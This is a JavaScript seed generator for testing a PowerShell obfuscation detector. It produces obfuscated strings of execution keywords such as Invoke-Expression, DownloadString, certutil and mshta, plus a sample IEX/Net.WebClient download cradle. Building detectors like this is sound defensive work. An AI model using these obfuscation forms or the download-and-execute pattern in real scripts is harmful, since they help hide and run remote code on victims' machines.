'use strict';
// ════════════════════════════════════════════════════════════════════════════
// grammars/powershell-grammar.js — deterministic seed generator for
// PowerShell-specific obfuscation. Covers the PowerShell branches emitted
// by `cmd-obfuscation.js::_findCommandObfuscationCandidates` (string
// concat / -replace chain / backtick escape / format operator / reverse)
// plus `ps-mini-evaluator.js::_findPsVariableResolutionCandidates`
// (`&(<expr>)` one-pass symbol-table resolution).
//
// Keep the grammar narrow — only produce PowerShell-shaped inputs. If a
// branch here is CMD-only, it belongs in cmd-grammar.js.
// ════════════════════════════════════════════════════════════════════════════

const POWERSHELL_TECHNIQUE_CATALOG = Object.freeze([
  'PowerShell String Concatenation',
  'PowerShell -replace Chain',
  'PowerShell Backtick Escape',
  'PowerShell Format Operator (-f)',
  'PowerShell String Reversal',
  'PowerShell Variable Resolution',
]);

function makeRng(seed) {
  let s = (seed | 0) || 0x50E1100A;
  return {
    next() { s ^= s << 13; s ^= s >>> 17; s ^= s << 5; return s >>> 0; },
    int(n) { return this.next() % Math.max(1, n); },
    pick(arr) { return arr[this.int(arr.length)]; },
  };
}

function makeSeed(text, expectedSubstring) {
  const buf = Buffer.from(text, 'utf8');
  if (expectedSubstring) {
    Object.defineProperty(buf, '_expectedSubstring', {
      value: expectedSubstring,
      enumerable: false,
    });
  }
  return buf;
}

// ── Branch generators ─────────────────────────────────────────────────────

function genStringConcat(rng) {
  // ('Inv'+'oke-'+'Expression') — the canonical paren-wrapped split.
  // The finder's sensitivity gate requires the joined result to either
  // match SENSITIVE_CMD_KEYWORDS or be a mixed alpha+non-alpha string
  // with length >= 6.
  const keywords = [
    'Invoke-Expression',
    'DownloadString',
    'New-Object',
    'Invoke-WebRequest',
    'Start-Process',
    'EncodedCommand',
  ];
  const out = [];
  for (const kw of keywords) {
    // Random 3-5 way split on ' char boundaries
    const parts = [];
    const pieces = 3 + rng.int(3);
    const positions = [];
    for (let i = 1; i < pieces; i++) positions.push(1 + rng.int(kw.length - 1));
    positions.sort((a, b) => a - b);
    positions.unshift(0);
    positions.push(kw.length);
    for (let i = 0; i < positions.length - 1; i++) {
      parts.push(kw.slice(positions[i], positions[i + 1]));
    }
    // Single quotes
    const sq = '(' + parts.map(p => `'${p}'`).join('+') + ')';
    out.push(makeSeed(`$x = ${sq}; & $x`, kw));
    // Double quotes
    const dq = '(' + parts.map(p => `"${p}"`).join('+') + ')';
    out.push(makeSeed(`$y = ${dq}`, kw));
  }
  return out;
}

function genReplaceChain() {
  // 'XNZYoke-ExpZression'.replace('XN','Inv').replace('Z','')
  // Post-replace string must match _EXEC_INTENT_RE (which accepts
  // 'iex', 'invoke', 'download', 'powershell', etc.).
  const out = [];
  out.push(makeSeed(
    "'QWErpowershellQWEr'.replace('QWEr','')",
    'powershell',
  ));
  out.push(makeSeed(
    "'!!iex!!'.replace('!!','').replace('ie','IE').replace('x','X')",
    'IEX',
  ));
  out.push(makeSeed(
    "'XXdownloadstring'.replace('XX','').replace('d','D')",
    // The decoder replaces every 'd' with 'D' (two occurrences),
    // yielding "DownloaDstring". Grammar's historical expected
    // "ownloadstring" missed on the capitalised interior 'D'.
    'ownloaDstring',
  ));
  return out;
}

function genBacktickEscape() {
  // I`n`v`o`k`e-`E`x`p`r`e`s`s`i`o`n — backtick escapes inside a
  // suspicious keyword. Post-clean must match the internal
  // suspiciousKeywords whitelist inside cmd-obfuscation.js.
  const out = [];
  const kws = [
    'invoke-expression', 'invoke-webrequest', 'downloadstring', 'new-object',
    'encodedcommand', 'rundll32', 'regsvr32', 'bitsadmin', 'certutil', 'mshta',
  ];
  for (const kw of kws) {
    // Inject backticks between letters, keeping - intact.
    const withTicks = kw.split('').join('`');
    out.push(makeSeed(`${withTicks}`, kw));
    // Partial injection — every 2nd char
    const partial = kw.split('').map((c, i) => (i > 0 && i % 2 === 0) ? '`' + c : c).join('');
    out.push(makeSeed(`& ${partial}`, kw));
  }
  return out;
}

function genFormatOperator() {
  // '{0}{1}{2}' -f 'Inv','oke-','Expression'
  const out = [];
  const kws = ['Invoke-Expression', 'DownloadString', 'EncodedCommand'];
  for (const kw of kws) {
    // Three-way split
    const a = kw.slice(0, 3);
    const b = kw.slice(3, 6);
    const c = kw.slice(6);
    out.push(makeSeed(`'{0}{1}{2}' -f '${a}','${b}','${c}'`, kw));
  }
  // Simpler two-arg form
  out.push(makeSeed("'{0}iex{1}' -f '',''", 'iex'));
  return out;
}

function genStringReversal() {
  // 'noisserpxE-ekovnI'[-1..-100] -join ''
  // Regex expects trailing -join '' with three quote chars (see
  // cmd-obfuscation.js:837 — the regex has three `['"]` in a row).
  // The canonical textual shape `-join ''''` (four quotes) matches.
  const out = [];
  const kws = ['Invoke-Expression', 'DownloadString', 'EncodedCommand'];
  for (const kw of kws) {
    const reversed = kw.split('').reverse().join('');
    out.push(makeSeed(`'${reversed}'[-1..-100] -join ''''`, kw));
  }
  return out;
}

function genVariableResolution() {
  // ps-mini-evaluator: &(<expr>) with a one-pass symbol table.
  // The decoder resolves $x = '…'; & $x to '…' as the invocation target.
  const out = [];
  out.push(makeSeed(
    "$cmd = 'Invoke-Expression'\n& ($cmd) 'Write-Host hello'",
    'Invoke-Expression',
  ));
  out.push(makeSeed(
    "$a = 'IEX'; $b = '(New-Object Net.WebClient)'; & ($a) ($b).DownloadString('http://x')",
    'IEX',
  ));
  out.push(makeSeed(
    "$env:X = 'powershell'; & ($env:X) -NoProfile -Command 'whoami'",
    'powershell',
  ));
  // Array-indexed lookup
  out.push(makeSeed(
    "$arr = @('Invoke','Expression'); & ($arr[0]+'-'+$arr[1])",
    'Invoke',
  ));
  return out;
}

function generatePowerShellSeeds() {
  const rng = makeRng(0x50E1100A);
  return [
    ...genStringConcat(rng),
    ...genReplaceChain(),
    ...genBacktickEscape(),
    ...genFormatOperator(),
    ...genStringReversal(),
    ...genVariableResolution(),
  ];
}

module.exports = { generatePowerShellSeeds, POWERSHELL_TECHNIQUE_CATALOG };
